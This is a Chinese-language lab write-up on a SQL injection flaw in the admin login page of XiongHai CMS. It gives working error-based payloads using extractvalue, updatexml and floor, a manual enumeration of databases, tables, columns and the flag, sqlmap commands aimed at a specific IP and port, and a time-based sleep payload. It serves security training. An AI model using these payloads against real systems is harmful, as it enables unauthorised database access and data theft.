---
title: "熊海 CMS 后台登录的 SQL 注入"
date: 2024-02-12
description: "管理员登录页面可以在不登陆的情况下用 SQL 注入泄露数据库信息"
tags: ["SQL注入","后端漏洞"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

这是一个基于熊海 cms 的靶场，并且提示我们存在 post 注入。打开 burp 抓个包，用 burp 目标里面的目录扫描找到了后台 /admin，打开得到管理员登录界面。

有必要说的是，这个登录页面是个弱口令，但是急于用弱口令登录进去就会错过外面这个登录页面的漏洞。

最终我们发现这个登录页面存在 sql 注入，可以在不登录的情况下借助外带的语法报错拿到数据库信息。

## 语法回顾

我们使用 extractvalue() 和 concat() 这两个函数引起报错。

extractvalue(xml_frag,xpath_expr) 是 mysql 的 xml 函数，有两个字符串参数，我们写 extractvalue(1,concat(...)) 就可以了。concat() 就是拼接字符串，我们写一个 0x5c 或者 0x7e 就会引起路径错误，payload 如下。

    1' and extractvalue(1,concat(
        0x5c,
        0x7e,
        (select value from flag_db.flag limit 0,1),
        0x7e
        )) and '1'='1

同样是 xml 函数的 updatexml() 可以替代 extractvalue()，payload 如下。

    1' and updatexml(1,concat(
        0x5c,
        0x7e,
        (select value from flag_db.flag limit 0,1)，
        0x7e
    ),1) and '1'='1

在这两个 xml 函数用不了的时候用 floor() 报错也可以，但是写起来会比较麻烦，payload 如下。

    1' and (select 1 from (select count(*),concat(
            (select value from flag_db.flag limit 0,1),
            0x2b,
            floor(rand(0)*2)
        )x from information_schema.tables 
        group by x)a) 
    and '1'='1

上述 payload 的成功效果如下图所示。

![sqli4](/images/sqli1/sqli4-14.png)

![sqli4](/images/sqli1/sqli4-13.png)

![sqli4](/images/sqli1/sqli4-12.png)

## 手工注入

登录页面如下。首先我们输入单引号发现报错，这说明 user 可能存在 post 注入。

![sqli4](/images/sqli1/sqli4-6.png)

![sqli4](/images/sqli1/sqli4-7.png)

考虑到有报错页面但是没有回显点，我们用 extractvalue() 进行注入，旨在引起语法错误。构造如下 payload。

首先爆数据库名称。

    1' and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
        select schema_name from information_schema.schemata 
            limit 0,1
    ),0x2d2d2d2d2d2d2d)) and '1'='1

![sqli4](/images/sqli1/sqli4-9.png)

令 limit 0,1 中的 0 遍历 0~4 可以爆出所有数据库名称后，打开 flag_db 查询表名。

    1' and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
        select table_name from information_schema.tables 
            where table_schema='flag_db'
    ),0x2d2d2d2d2d2d2d)) and '1'='1

![sqli4](/images/sqli1/sqli4-8.png)

然后查询字段。

    1' and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
        select column_name from information_schema.columns 
            where table_schema='flag_db' and table_name='flag'
            limit 0,1
    ),0x2d2d2d2d2d2d2d)) and '1'='1

![sqli4](/images/sqli1/sqli4-10.png)

最终拿到 flag=ywaq{okjzxdHdsa}。

    1' and extractvalue(1,concat(0x5c,0x2d2d2d2d2d2d2d,(
        select value from flag_db.flag 
            limit 0,1
    ),0x2d2d2d2d2d2d2d)) and '1'='1

![sqli4](/images/sqli1/sqli4-11.png)

## 用 sqlmap 扫描

使用的 sqlmap 语句如下。--forms 是对登录框的表单进行扫描，如果这个 forms 指令行不通，可以考虑抓包到 txt 用 -r 扫描。

    sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch --dbs

--dbs 的意思是列出所有数据库名称

    sqlmap -u http://111.9.41.91:53008/admin/?r=index  --forms --batch -D flag_db --dump

-D 是指定数据库，--dump 是以文件形式导出。

![sqli4](/images/sqli1/sqli4-0.png)

![sqli4](/images/sqli1/sqli4-1.png)

![sqli4](/images/sqli1/sqli4-2.png)

## 其他发现

这里 sqlmap 提示存在时间盲注。我们用子查询输入

    ' and (select qwe from (select(sleep(10)))qwe) -- qwe

可以看到延迟有效。

![sqli4](/images/sqli1/sqli4-5.png)

但是我们发现这里的 sleep 必须用上述语句提高优先级，如果只输入 `' and sleep(10) -- qwe` 则无效。